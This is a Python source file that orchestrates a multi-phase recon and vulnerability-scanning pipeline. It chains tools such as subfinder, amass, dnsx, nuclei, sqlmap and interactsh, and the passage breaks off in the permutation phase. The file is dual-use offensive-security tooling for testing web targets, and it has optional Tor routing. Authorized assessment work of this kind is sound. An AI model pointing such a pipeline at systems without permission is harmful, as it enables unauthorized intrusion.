#!/usr/bin/env python3
"""
reconchain.py — orchestrator for a chained recon pipeline.
Pipeline
========
01-RECON   subfinder | amass                          --> all_subs.txt
02-RESOLVE dnsx                                      --> resolved.txt
03-PERMUTE dnsgen | dnsx                             --> permuted.txt
04-SCAN    naabu/nmap | httpx | nuclei                --> ports.txt / hosts.txt / takeover.txt
05-HARVEST gau | gospider | katana                   --> urls_gau.txt / urls_katana.txt
           | subjs | waymore
06-JSINTEL SecretFinder | nuclei                     --> js_secrets.txt
07-PARAMS  Arjun                                     --> params.txt
08-FUZZ    ffuf | feroxbuster                        --> fuzz.txt
09-VULNSCAN nuclei (full + tech)                     --> nuclei.txt
10-TLSCMS  testssl.sh | wpscan                       --> tls_wp.txt
11-INJECT  kxss | dalfox | sqlmap | SSRF probes      --> vulns.txt
12-SSTI    SSTI probes                                --> ssti.txt
13-OOB     interactsh-client                          --> oast/callbacks.txt
17-REPORT  HTML/MD/JSON/text                          --> summary.json / report.html / report.md
14-ORIGIN  favicon hash | crt.sh | dig | ipinfo.io   --> origin.txt
15-SECRETS gitleaks | JS regex/entropy               --> secrets.txt
16-AUTHZ   auth bypass headers | mass assignment      --> authz.txt
Usage
-----
  reconchain.py -d example.com -o ./out
  reconchain.py -d example.com --only 01-RECON,02-RESOLVE,04-SCAN
  reconchain.py -d example.com --skip 10-TLSCMS,11-INJECT
  reconchain.py -d example.com --resume           # reuse ./out/state.json
  reconchain.py -d example.com --fast             # fast: 01-RECON→02-RESOLVE→04-SCAN→05-HARVEST→report
  reconchain.py -d example.com --no-color -q
Stdlib only. Any missing tool is reported and its phase is skipped (non-fatal
unless the step is marked required).
"""

from __future__ import annotations
import argparse
import asyncio
import contextlib
import hashlib
import inspect
import json
import os
import re
import shlex
import shutil
import signal
import struct
import subprocess
import sys
import time
import math
import urllib.request
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

_re = re  # module-level alias consumed by tests
# tqdm is an OPTIONAL dependency. The orchestrator must stay runnable with the
# stdlib alone (see module docstring + empty pyproject `dependencies`), so when
# tqdm is absent we fall back to a tiny no-op shim that preserves the small
# surface we use (`tqdm(...)` bars with update/set_description/close and the
# `tqdm.write` classmethod). Install tqdm for live progress bars.
try:
    from tqdm import tqdm
except ImportError:

    class tqdm:  # type: ignore[no-redef]
        _global_pos = 0

        def __init__(
            self, *args: Any, total: Optional[int] = None, desc: Optional[str] = None, **kwargs: Any
        ) -> None:
            self.total = total
            self.desc = desc
            self._n = 0
            self._closed = False

        def update(self, n: int = 1) -> None:
            self._n += n
            if self.desc:
                print(f"  [{self._n}/{self.total}] {self.desc}", flush=True)

        def set_description(self, desc: Optional[str] = None, refresh: bool = True) -> None:
            if desc != self.desc:
                self.desc = desc
                if not self._closed:
                    print(f"  [{self._n}/{self.total}] {desc}", flush=True)

        def close(self) -> None:
            self._closed = True

        @classmethod
        def write(cls, msg: str = "", *args: Any, **kwargs: Any) -> None:
            print(msg, flush=True)


# ─────────────────────── hostname validation (chain glue) ────────────────────
# Used by the 01-RECON merge and the 02-RESOLVE parse to filter obvious garbage out of the
# chain. Accepts DNS hostnames: 1-253 chars, dot-separated labels of
# [a-z0-9-], with no leading or trailing hyphen in labels.
_HOSTNAME_RE = re.compile(
    r"^(?=.{1,253}$)(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+"
    r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.?$"
)
__version__ = "1.4.0"
VALID_PHASES = {
    "01-RECON",
    "02-RESOLVE",
    "03-PERMUTE",
    "04-SCAN",
    "05-HARVEST",
    "06-JSINTEL",
    "07-PARAMS",
    "08-FUZZ",
    "09-VULNSCAN",
    "10-TLSCMS",
    "11-INJECT",
    "12-SSTI",
    "13-OOB",
    "17-REPORT",
    "14-ORIGIN",
    "15-SECRETS",
    "16-AUTHZ",
}
FAST_PHASES = {"01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST", "17-REPORT"}
PhaseSet = Set[str]


def _is_valid_hostname(s: str) -> bool:
    """True if `s` looks like an FQDN-shaped hostname (has at least one dot)."""
    if not s:
        return False
    s = s.rstrip(".").lower()
    if "." not in s or any(c.isspace() or c in "[]()<>{}" for c in s):
        return False
    return bool(_HOSTNAME_RE.match(s))


def _is_under_domain(host: str, domain: str) -> bool:
    """True if `host` is `domain` itself or a subdomain of `domain`."""
    h = host.rstrip(".").lower()
    d = domain.rstrip(".").lower()
    return h == d or h.endswith("." + d)


def _target_token(line: str) -> str:
    """Return the first URL/host token from a tool output line."""
    return line.strip().split()[0] if line.strip() else ""


def _parse_httpx_tech(src: Path, dst: Path) -> int:
    """Parse httpx -tech-detect output into a tech-annotated file.
    httpx format:  URL [status] [title] [tech1,tech2] [final_url]
    Writes lines like: URL  [status]  [title]  [tech1,tech2]
    """
    seen: Set[str] = set()
    for line in read_lines(src):
        line = line.strip()
        if not line:
            continue
        url = line.split()[0]
        brackets = re.findall(r'\[.*?\]', line)
        if len(brackets) >= 3:
            status = brackets[0]
            title = brackets[1]
            tech = brackets[2]
            entry = f"{url} {status} {title} {tech}".rstrip()
            if entry not in seen:
                seen.add(entry)
    if seen:
        ensure(dst).write_text("\n".join(sorted(seen)) + "\n")
    return len(seen)


def _target_lines(path: Path) -> List[str]:
    return [_target_token(line) for line in read_lines(path) if _target_token(line)]


def _write_target_tokens(src: Path, dst: Path) -> int:
    seen: Set[str] = set()
    for token in _target_lines(src):
        if token not in seen:
            seen.add(token)
    ensure(dst).write_text("\n".join(sorted(seen)) + ("\n" if seen else ""))
    return len(seen)


# ───────────────────────────── pretty logging ──────────────────────────────
def _color() -> bool:
    return sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


C = {
    "r": "\033[0m" if _color() else "",
    "d": "\033[2m" if _color() else "",
    "g": "\033[32m" if _color() else "",
    "y": "\033[33m" if _color() else "",
    "b": "\033[34m" if _color() else "",
    "c": "\033[36m" if _color() else "",
    "m": "\033[35m" if _color() else "",
    "red": "\033[31m" if _color() else "",
}
LVL = {"info": C["c"], "ok": C["g"], "warn": C["y"], "err": C["red"], "skip": C["d"]}


def disable_color() -> None:
    for key in C:
        C[key] = ""
    for key in LVL:
        LVL[key] = ""


def log(lvl: str, msg: str) -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    tqdm.write(f"{C['d']}{ts}{C['r']} {LVL[lvl]}[{lvl.upper():4}]{C['r']} {msg}")


# ────────────────────────────── tool registry ──────────────────────────────
class Tools:
    """Cached presence check for external binaries."""

    def __init__(self) -> None:
        self._cache: Dict[str, bool] = {}
        self.missing_set: Set[str] = set()
        self.missing: List[str] = []  # insertion-ordered, deduped

    def have(self, *names: str) -> List[str]:
        out: List[str] = []
        for n in names:
            if n not in self._cache:
                ok = shutil.which(n) is not None
                self._cache[n] = ok
                if not ok and n not in self.missing_set:
                    self.missing_set.add(n)
                    self.missing.append(n)
            if self._cache[n]:
                out.append(n)
        return out

    def has(self, name: str) -> bool:
        return bool(self.have(name))

    def seed_missing(self, names: List[str]) -> None:
        """Pre-populate the missing-tools list (used for --resume)."""
        for n in names:
            if n not in self.missing_set:
                self.missing_set.add(n)
                self.missing.append(n)


# ─────────────────────────── subprocess helpers ────────────────────────────
@dataclass
class PipelineConfig:
    """Shared configuration carried through the pipeline."""
    sqlmap_level: int = 1
    sqlmap_risk: int = 1
    delay: float = 0.0
    rate_limit: int = 0
    sample_urls_fuzz: int = 5
    sample_urls_params: int = 50

    sample_hosts_ssl: int = 10
    sample_hosts_origin: int = 10
    sample_endpoints_l: int = 20
    sample_urls_xss_blind: int = 20
    sample_urls_ssti: int = 5
    sample_endpoints_post: int = 5
    sample_endpoints_cors: int = 10
    nuclei_exclude_tags: str = ""
    proxy: str = ""


def _auto_detect_proxy() -> str:
    for var in ("ALL_PROXY", "HTTPS_PROXY", "HTTP_PROXY", "PROXY",
                "all_proxy", "https_proxy", "http_proxy", "proxy"):
        val = os.environ.get(var, "")
        if val:
            return val
    return ""


def _auto_detect_cookies() -> str:
    val = os.environ.get("COOKIE", "")
    if val:
        return val
    cookie_file = Path("cookies.txt")
    if cookie_file.exists():
        return cookie_file.read_text().strip()
    return ""


def _extra_headers_dict() -> Dict[str, str]:
    """Build {Cookie: ..., Header: val} dict from env vars."""
    headers: Dict[str, str] = {}
    cookie = os.environ.get("COOKIE", "")
    if cookie:
        headers["Cookie"] = cookie
    headers_raw = os.environ.get("EXTRA_HEADERS", "")
    if headers_raw:
        for hdr in headers_raw.split("\n"):
            hdr = hdr.strip()
            if hdr and ":" in hdr:
                k, v = hdr.split(":", 1)
                headers[k.strip()] = v.strip()
    return headers


def _extra_http_args() -> List[str]:
    """Build [-H, "Cookie: ...", -H, "Header: val", ...] from env vars."""
    args: List[str] = []
    cookie = os.environ.get("COOKIE", "")
    if cookie:
        args += ["-H", f"Cookie: {cookie}"]
    headers_raw = os.environ.get("EXTRA_HEADERS", "")
    if headers_raw:
        for h in headers_raw.split("\n"):
            h = h.strip()
            if h:
                args += ["-H", h]
    return args


def _get_urlopener() -> object:
    """Return a urlopen-compatible callable that respects proxy configuration.
    Returns either urllib.request.urlopen (no proxy) or a proxy-wrapped version."""
    proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
    if proxy:
        handler = urllib.request.ProxyHandler({
            "http": proxy,
            "https": proxy,
        })
        opener = urllib.request.build_opener(handler)
        return opener.open
    return urllib.request.urlopen


async def _throttle() -> None:
    """Apply --delay between requests if configured."""
    delay = _PIPELINE_CFG.delay
    if delay > 0:
        await asyncio.sleep(delay)


def _throttle_sync() -> None:
    """Synchronous throttle for non-async probe loops."""
    delay = _PIPELINE_CFG.delay
    if delay > 0:
        time.sleep(delay)


@dataclass
class StepResult:
    name: str
    cmd: List[str]
    rc: int
    duration: float
    log_path: Optional[Path] = None
    note: str = ""


def _run_blocking(
    cmd: List[str], timeout: int, cwd: Optional[Path], log_path: Path
) -> Tuple[int, float]:
    if _USE_PROXYCHAINS:
        cmd = ["proxychains4"] + cmd
    t0 = time.monotonic()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with log_path.open("wb") as logf:
        proc: Optional[subprocess.Popen[bytes]] = None
        try:
            proc = subprocess.Popen(
                cmd,
                cwd=str(cwd) if cwd else None,
                stdin=subprocess.DEVNULL,
                stdout=logf,
                stderr=subprocess.STDOUT,
                start_new_session=True,
            )
            _register_proc(proc)
            proc.wait(timeout=timeout)
            with contextlib.suppress(ValueError):
                _SPAWNED_PIDS.remove(proc.pid)
            return proc.returncode, time.monotonic() - t0
        except subprocess.TimeoutExpired:
            if proc is not None and proc.poll() is None:
                with contextlib.suppress(ProcessLookupError):
                    os.killpg(proc.pid, signal.SIGTERM)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    with contextlib.suppress(ProcessLookupError):
                        os.killpg(proc.pid, signal.SIGKILL)
                    with contextlib.suppress(Exception):
                        proc.wait(timeout=5)
            if proc is not None and proc.pid in _SPAWNED_PIDS:
                with contextlib.suppress(ValueError):
                    _SPAWNED_PIDS.remove(proc.pid)
            with log_path.open("ab") as f:
                f.write(f"\n[timeout after {timeout}s]\n".encode("utf-8"))
            return 124, time.monotonic() - t0
        except FileNotFoundError as e:
            with log_path.open("ab") as f:
                f.write(f"\n[binary not found: {e}]\n".encode("utf-8"))
            return 127, time.monotonic() - t0
        except (PermissionError, OSError) as e:
            with log_path.open("ab") as f:
                f.write(f"\n[exec error: {e}]\n".encode("utf-8"))
            return 127, time.monotonic() - t0


async def _run(name: str, cmd: List[str], timeout: int, outdir: Path, note: str = "") -> StepResult:
    logp = outdir / "logs" / f"{name}.log"
    if not cmd:
        log("skip", f"{name} (missing tool)")
        return StepResult(name, [], 0, 0.0, logp, note=note or "skipped")
    log("info", f"{name}  $ {cmd[0]} {(' '.join(cmd[1:3]))}{' …' if len(cmd) > 3 else ''}")
    rc, dur = await asyncio.to_thread(_run_blocking, cmd, timeout, outdir, logp)
    lvl = "ok" if rc == 0 else "warn" if rc in (1, 124, 127) else "err"
    log(lvl, f"{name} → rc={rc} in {dur:.1f}s")
    return StepResult(name, cmd, rc, dur, logp, note=note)


# Concurrency cap so a phase with many jobs (e.g. phase 08-FUZZ: 5 URLs × 3 fuzzers)
# does not fork-bomb the host. Defaults to 2× CPU count (auto-scaled);
# pass -j/--jobs to override.
MAX_PARALLEL_JOBS = max(4, (os.cpu_count() or 4) * 2)
# Process-wide flag to wrap commands with proxychains4 when tor is enabled.
_USE_PROXYCHAINS = False
# Track all spawned subprocess PIDs so we can clean them up on shutdown.
_SPAWNED_PIDS: List[int] = []


def _cleanup_child_procs() -> None:
    """Kill all tracked child process groups on shutdown."""
    for pid in list(_SPAWNED_PIDS):
        with contextlib.suppress(ProcessLookupError, OSError):
            os.killpg(pid, signal.SIGTERM)
    _SPAWNED_PIDS.clear()


def _register_proc(proc: subprocess.Popen) -> None:
    _SPAWNED_PIDS.append(proc.pid)

# Process-wide job semaphore. When several independent phases run concurrently
# (see STAGES), they all draw from this single semaphore so the total number of
# live external processes stays bounded by MAX_PARALLEL_JOBS regardless of how
# many phases are in flight. Created on the running loop in run_pipeline; falls
# back to a fresh per-call semaphore when unset (e.g. a phase called directly
# from a test).
_JOB_SEM: Optional[asyncio.Semaphore] = None
_PIPELINE_CFG: PipelineConfig = PipelineConfig()


class Progress:
    def __init__(self, total: int, stages: Optional[List[List[str]]] = None):
        self.bar = tqdm(total=total, desc="Scan", position=0)
        self.stages = stages or []
        self._completed = 0

    def next(self, name: str):
        self._completed += 1
        if self.bar.total == 0:
            return
        stage_idx = 0
        if self.stages:
            phase_count = 0
            for i, stage in enumerate(self.stages):
                phase_count += len(stage)
                if self._completed <= phase_count:
                    stage_idx = i
                    break
        pct = (self._completed / self.bar.total) * 100
        stage_info = f"Stage {stage_idx + 1}/{len(self.stages)} " if self.stages else ""
        self.bar.set_description(f"{stage_info}[{pct:.0f}%] {name}")
        self.bar.update(1)

    def close(self):
        self.bar.close()


async def run_parallel(
    jobs: List[Tuple[str, List[str], int]], outdir: Path, desc: str = "jobs"
) -> List[StepResult]:
    sem = _JOB_SEM if _JOB_SEM is not None else asyncio.Semaphore(MAX_PARALLEL_JOBS)
    pbar = tqdm(total=len(jobs), desc=desc, leave=False)

    async def _guarded(n: str, c: List[str], t: int) -> StepResult:
        async with sem:
            res = await _run(n, c, t, outdir)
            pbar.update(1)
            return res

    coros = [_guarded(n, c, t) for n, c, t in jobs]
    try:
        return await asyncio.gather(*coros)
    finally:
        pbar.close()


# ───────────────────────────── file utilities ───────────────────────────────
def ensure(p: Path) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    return p


def read_lines(p: Path) -> List[str]:
    """Return non-blank, non-`#`-prefixed lines. Used for *counting* and as
    a permissive existence check. For driving tool input, prefer passing
    the file path directly (tools handle their own comments)."""
    if not p.is_file():
        return []
    return [
        ln.strip()
        for ln in p.read_text(errors="ignore").splitlines()
        if ln.strip() and not ln.lstrip().startswith("#")
    ]


def count_nonblank(p: Path) -> int:
    """Count of non-blank lines (does NOT drop `#`-prefixed lines)."""
    if not p.is_file():
        return 0
    return sum(1 for ln in p.read_text(errors="ignore").splitlines() if ln.strip())


def merge_unique(
    srcs: List[Path], dst: Path, validator: Optional[Callable[[str], bool]] = None
) -> int:
    seen: Dict[str, None] = {}
    dst_resolved = dst.resolve()
    for s in srcs:
        if not s:
            continue
        # is_file() (not exists()) so a tool that writes a *directory* where we
        # expected a file (e.g. gospider's -o output folder) is skipped instead
        # of raising IsADirectoryError and crashing the whole phase.
        if not s.is_file():
            continue
        # never feed the destination back into itself (recursion / self-merge)
        if s.resolve() == dst_resolved:
            continue
        for ln in s.read_text(errors="ignore").splitlines():
            ln = ln.strip()
            if not ln or ln.startswith("#"):
                continue
            if validator is not None and not validator(ln):
                continue
            if ln not in seen:
                seen[ln] = None
    if not seen:
        return 0
    ensure(dst)
    dst.write_text("\n".join(seen) + "\n")
    return len(seen)


def _downsample_file(path: Path, n: int = 1) -> None:
    """Keep only the first `n` non-blank, non-comment lines of a text file (in-place)."""
    if not path.is_file():
        return
    lines = [ln for ln in path.read_text(errors="ignore").splitlines()
             if ln.strip() and not ln.lstrip().startswith("#")]
    if len(lines) > n:
        path.write_text("\n".join(lines[:n]) + "\n")


def safe_suffix(s: str) -> str:
    """Deterministic, low-collision file suffix. Uses the first 12 hex
    chars of sha1(s) — collision odds are astronomically small for any
    realistic input set, unlike the old `(int(h[:8],16) % 9999)`."""
    return hashlib.sha1(s.encode("utf-8", errors="ignore")).hexdigest()[:12]


def _safe_name(s: str, maxlen: int = 32) -> str:
    """Sanitize a string for use as a log filename (no path separators)."""
    safe = s.replace("/", "_").replace(":", "_")
    return safe[:maxlen]


def read_jsonl(p: Path) -> List[Any]:
    """Read a JSON-Lines file. Falls back to a single JSON object/array
    if the file isn't line-delimited. Never raises on bad input."""
    if not p.exists():
        return []
    raw = p.read_text(errors="ignore").strip()
    if not raw:
        return []
    # try JSONL first
    out: List[Any] = []
    if raw.startswith("{") or "\n{" in raw:
        for ln in raw.splitlines():
            ln = ln.strip()
            if not ln or not ln.startswith("{"):
                continue
            try:
                out.append(json.loads(ln))
            except json.JSONDecodeError:
                continue
        if out:
            return out
    # single JSON object or array
    try:
        d = json.loads(raw)
    except json.JSONDecodeError:
        return []
    return d if isinstance(d, list) else [d]


# ──────────────────────────── interactsh manager ────────────────────────────
class Interactsh:
    """Background OOB collector. Start before phase 08-FUZZ, stop at phase 13-OOB."""

    def __init__(self, outdir: Path) -> None:
        self.outdir = outdir
        self.proc: Optional[subprocess.Popen] = None
        self.domain: Optional[str] = None
        self.log = ensure(outdir / "logs" / "interactsh.log")
        self._log_fh = None
        # File offset for domain parsing — guarantees we only read the
        # output produced by THIS run, not stale content from a prior run.
        self._start_pos = 0

    @property
    def available(self) -> bool:
        return shutil.which("interactsh-client") is not None

    def _kill_proc(self) -> None:
        if self._log_fh is not None:
            with contextlib.suppress(Exception):
                self._log_fh.close()
            self._log_fh = None
        if not self.proc:
            return
        if self.proc.poll() is None:
            with contextlib.suppress(ProcessLookupError):
                self.proc.send_signal(signal.SIGINT)
            try:
                self.proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self.proc.kill()
                with contextlib.suppress(Exception):
                    self.proc.wait(timeout=5)

    def start(self) -> bool:
        if not self.available:
            log("warn", "interactsh-client not found; OOB phase will be empty")
            return False
        token = os.environ.get("INTERACTSH_TOKEN")
        # rotate log so a stale "Domain: <old>" line from a previous run
        # can never be mistaken for this run's announcement.
        with contextlib.suppress(Exception):
            self.log.unlink()
        ensure(self.log)
        cmd = ["interactsh-client", "-v"]
        if token:
            cmd += ["-t", token]
        try:
            self._log_fh = self.log.open("ab")
            # remember the byte offset BEFORE the process starts so we
            # don't miss any output produced during the startup window.
            self._start_pos = self.log.stat().st_size
            self.proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=self._log_fh, stderr=subprocess.STDOUT)
        except FileNotFoundError:
            return False
        except Exception as e:
            log("err", f"interactsh start failed: {e}")
            self._kill_proc()
            return False
        deadline = time.time() + 90
        try:
            while time.time() < deadline:
                if self.proc.poll() is not None:
                    log("warn", "interactsh-client exited prematurely")
                    return False
                try:
                    with self.log.open("rb") as fh:
                        fh.seek(self._start_pos)
                        txt = fh.read().decode("utf-8", errors="ignore")
                except FileNotFoundError:
                    txt = ""
                for ln in txt.splitlines():
                    # Strip ANSI escape sequences
                    clean = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", ln).strip()
                    # Old format: "Domain: <domain>"
                    if "Domain" in clean and ":" in clean:
                        cand = clean.split(":", 1)[1].strip()
                        if cand and "." in cand and " " not in cand:
                            self.domain = cand
                            log("ok", f"interactsh domain: {self.domain}")
                            return True
                    # New format: "[INF] <subdomain>.oast.<tld>"
                    # Match lines that look like a bare hostname after [INF]
                    if re.search(r"[a-zA-Z0-9-]+\.oast\.[a-z]+", clean):
                        cand = clean.split()[-1].strip()
                        if cand and "." in cand and " " not in cand:
                            self.domain = cand
                            log("ok", f"interactsh domain: {self.domain}")
                            return True
                time.sleep(1)
        except Exception:
            self._kill_proc()
            raise
        log("warn", "interactsh did not announce a domain in time")
        return False

    def stop(self) -> Path:
        out = ensure(self.outdir / "oast" / "callbacks.txt")
        self._kill_proc()
        events: List[dict] = []
        try:
            with self.log.open("r", errors="ignore") as fh:
                for ln in fh:
                    ln = ln.strip()
                    if ln.startswith("{") and '"protocol"' in ln:
                        with contextlib.suppress(json.JSONDecodeError):
                            ev = json.loads(ln)
                            events.append(
                                {
                                    "ts": ev.get("timestamp"),
                                    "proto": ev.get("protocol"),
                                    "id": ev.get("unique-id"),
                                    "from": ev.get("remote-address"),
                                    "domain": self.domain,
                                }
                            )
        except FileNotFoundError:
            pass
        with out.open("w") as f:
            for e in events:
                f.write(json.dumps(e) + "\n")
        log("ok", f"interactsh: {len(events)} OOB callback(s) captured")
        return out


# ─────────────────────────── phase implementations ─────────────────────────
# small helper: hostname token safety check
_SAFE_HOST = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9\-]{0,61}[A-Za-z0-9])?)*$")


async def phase_01_RECON(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    resume: bool = False, force: bool = False
) -> Dict[str, Any]:
    if skip & {"01-RECON"}:
        return {}
    out = outdir / "all_subs.txt"
    if out.exists() and not force:
        return {"01-RECON": str(out), "count": count_nonblank(out)}
    log("info", "Phase 01-RECON: subdomain enumeration")
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("subfinder"):
        jobs.append(
            (
                "subfinder",
                ["subfinder", "-d", domain, "-silent", "-o", str(outdir / "subs_subfinder.txt")],
                900,
            )
        )
    if t.has("amass"):
        # amass v4: passive is the default (the old `-passive` flag is
        # deprecated) and `enum` emits *relationship* records on stdout, e.g.
        #   `sub.example.com (FQDN) --> a_record --> 1.2.3.4 (IPAddress)`
        # (the `-o` file holds the same raw terminal text, NOT a clean list).
        # Feeding those lines straight into the merge made every line fail the
        # hostname validator, so amass silently contributed zero subdomains.
        # Run via a runner that extracts the `<name> (FQDN)` tokens; the 01-RECON
        # merge's _under_domain validator then keeps only in-scope hosts.
        runner = outdir / "logs" / "amass.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"OUT={shlex.quote(str(outdir / 'subs_amass.txt'))}\n"
            f"DOMAIN={shlex.quote(domain)}\n"
            ': > "$OUT"\n'
            'amass enum -d "$DOMAIN" -nocolor 2>/dev/null '
            "| grep --line-buffered -oE '[A-Za-z0-9._-]+ \\(FQDN\\)' "
            "| sed 's/ (FQDN)$//' >> \"$OUT\" || true\n"
        )
        runner.chmod(0o755)
        jobs.append(("amass", ["bash", str(runner)], 1800))

    if not jobs:
        log("warn", "01-RECON: no subdomain tools available")
        ensure(out)
        return {"01-RECON": str(out), "count": 0}

    # Incremental merge: while tools run, merge partial results into all_subs.txt
    # every 30s so downstream phases (02-RESOLVE, 04-SCAN, 05-HARVEST) can start early.
    def _under_domain(s: str) -> bool:
        return _is_valid_hostname(s) and _is_under_domain(s, domain)

    _a1_sources = [
        outdir / "subs_subfinder.txt",
        outdir / "subs_amass.txt",
    ]

    async def _incremental_merge() -> None:
        """Merge tool outputs into all_subs.txt every 30s during execution."""
        _last_size = 0
        while True:
            await asyncio.sleep(30)
            existing = [p for p in _a1_sources if p.exists()]
            if existing:
                current = sum(len(read_lines(p)) for p in existing)
                if current > _last_size:
                    merge_unique(_a1_sources, out, validator=_under_domain)
                    _last_size = current
                    log("info", f"01-RECON: incremental merge — {count_nonblank(out)} subdomains so far")

    merge_task = asyncio.create_task(_incremental_merge())
    try:
        results = await run_parallel(jobs, outdir)
    finally:
        merge_task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await merge_task

    # Surface partial tool failures in summary.json (BUG-5). rc==0 and
    # skipped are not failures; anything else (timeouts, crash, signal)
    # is recorded so the user knows the merged output may be partial.
    failures = {r.name: r.rc for r in results if r.rc not in (0, None) and r.note != "skipped"}

    # Final merge
    n = merge_unique(_a1_sources, out, validator=_under_domain)
    if n == 0:
        ensure(out)  # Empty file signals 01-RECON completed (no subs found)
    log("ok", f"01-RECON: {n} unique subdomains → {out}")
    ret: Dict[str, Any] = {"01-RECON": str(out), "count": n}
    if failures:
        ret["failures"] = failures
        log("warn", f"01-RECON: partial — failed tools: {failures}")
    return ret


async def phase_02_RESOLVE(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    resume: bool = False,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"02-RESOLVE"}:
        return {}
    out = outdir / "resolved.txt"
    full = outdir / "resolved_full.txt"
    if out.exists() and not force:
        return {"02-RESOLVE": str(out), "count": count_nonblank(out)}
    subs_file = Path(prev.get("01-RECON") or outdir / "all_subs.txt")

    # Streaming: poll for input from 01-RECON (which may be writing incrementally)
    if not read_lines(subs_file):
        log("info", "02-RESOLVE: waiting for subdomains from 01-RECON…")
        for _ in range(12):  # up to ~1 min
            await asyncio.sleep(5)
            if read_lines(subs_file):
                break
        if not read_lines(subs_file):
            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
            return {"02-RESOLVE": str(out), "count": 0}

    log("info", "Phase 02-RESOLVE: dnsx resolution (streaming)")
    _a2_processed: Set[str] = set()
    _a2_stable_count = 0

    async def _resolve_batch(batch_subs: Path) -> int:
        """Run dnsx on a batch of subdomains, append results to resolved files."""
        tmp = outdir / ".a2_batch.txt"
        batch = [s.strip().lower() for s in read_lines(batch_subs)
                 if s.strip() and s.strip().lower() not in _a2_processed]
        if not batch:
            return 0
        _a2_processed.update(b.lower() for b in batch)
        tmp.write_text("\n".join(batch) + "\n")
        if not t.has("dnsx"):
            merge_unique([tmp], out)
            tmp.unlink(missing_ok=True)
            return len(batch)
        full_batch = outdir / ".a2_full_batch.txt"
        res = await _run(
            "dnsx",
            ["dnsx", "-silent", "-l", str(tmp), "-o", str(full_batch),
             "-a", "-aaaa", "-cname", "-resp"],
            1800, outdir,
        )
        if full_batch.exists() and read_lines(full_batch):
            cnt = _merge_dnsx_output(full_batch, out, full)
            full_batch.unlink(missing_ok=True)
            tmp.unlink(missing_ok=True)
            return cnt
        full_batch.unlink(missing_ok=True)
        tmp.unlink(missing_ok=True)
        return 0

    # Process initial available subdomains
    n = await _resolve_batch(subs_file)
    log("info", f"02-RESOLVE: resolved {n} initial hosts")

    # Poll for new subdomains while 01-RECON may still be running (up to 10 min total)
    for _ in range(40):  # 40 * 15s = 10 min ceiling
        await asyncio.sleep(15)
        new_subs = [s.strip().lower() for s in read_lines(subs_file)
                    if s.strip() and s.strip().lower() not in _a2_processed]
        if not new_subs:
            _a2_stable_count += 1
            if _a2_stable_count >= 4:  # no new subs for ~1min → assume 01-RECON done
                break
            continue
        _a2_stable_count = 0
        new_count = await _resolve_batch(subs_file)
        if new_count:
            log("info", f"02-RESOLVE: resolved {new_count} more hosts (streaming batch)")

    c = count_nonblank(out)
    log("info", f"02-RESOLVE: {c} total unique hosts resolved")
    return {"02-RESOLVE": str(out), "count": c}


async def phase_03_PERMUTE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"03-PERMUTE"}:
        return {}
    _a3_stamp = outdir / ".phase_03.stamp"
    if _a3_stamp.exists() and not force:
        _a3_out = outdir / "all_subs.txt"
        return {"01-RECON": str(_a3_out), "03-PERMUTE": str(_a3_out), "count": count_nonblank(_a3_out)}
    log("info", "Phase 03-PERMUTE: subdomain permutation (dnsgen → dnsx)")
    # Input: all discovered subdomains from 01-RECON
    subs_in = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    if not subs_in.exists() or not read_lines(subs_in):
        log("info", "03-PERMUTE: waiting for subdomains from 01-RECON…")
        for _ in range(60):
            await asyncio.sleep(5)
            if subs_in.exists() and read_lines(subs_in):
                break
        else:
            log("warn", "03-PERMUTE: no subdomains to permute; skipping")
            return {}
    permuted = outdir / "subs_permuted.txt"
    resolved = outdir / "subs_permuted_resolved.txt"
    merged = outdir / "subs_merged.txt"
    all_subs = outdir / "all_subs.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("dnsgen"):
        runner = outdir / "logs" / "dnsgen_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(subs_in))}\n"
            f"OUT={shlex.quote(str(permuted))}\n"
            "dnsgen \"$IN\" 2>/dev/null | sort -u > \"$OUT\" || true\n"
        )
        runner.chmod(0o755)
        jobs.append(("dnsgen", ["bash", str(runner)], 600))
    await run_parallel(jobs, outdir)
    # Resolve permuted subdomains with dnsx
    if permuted.exists() and read_lines(permuted) and t.has("dnsx"):
        resolved_job = (
            "dnsx-permuted",
            ["dnsx", "-silent", "-l", str(permuted),
             "-o", str(resolved),
             "-resp", "-a", "-aaaa"],
            600,
        )
        await run_parallel([resolved_job], outdir)
    # Merge permuted results into the existing subdomain list
    merge_srcs = [subs_in]
    if resolved.exists() and read_lines(resolved):
        # dnsx -resp output: sub.example.com [A] [1.2.3.4] → extract host
        resolved_hosts = outdir / "subs_permuted_hosts.txt"
        clean: List[str] = []
        for ln in read_lines(resolved):
            parts = ln.split()
            if parts:
                host = parts[0].strip()
                if _is_valid_hostname(host) and _is_under_domain(host, domain):
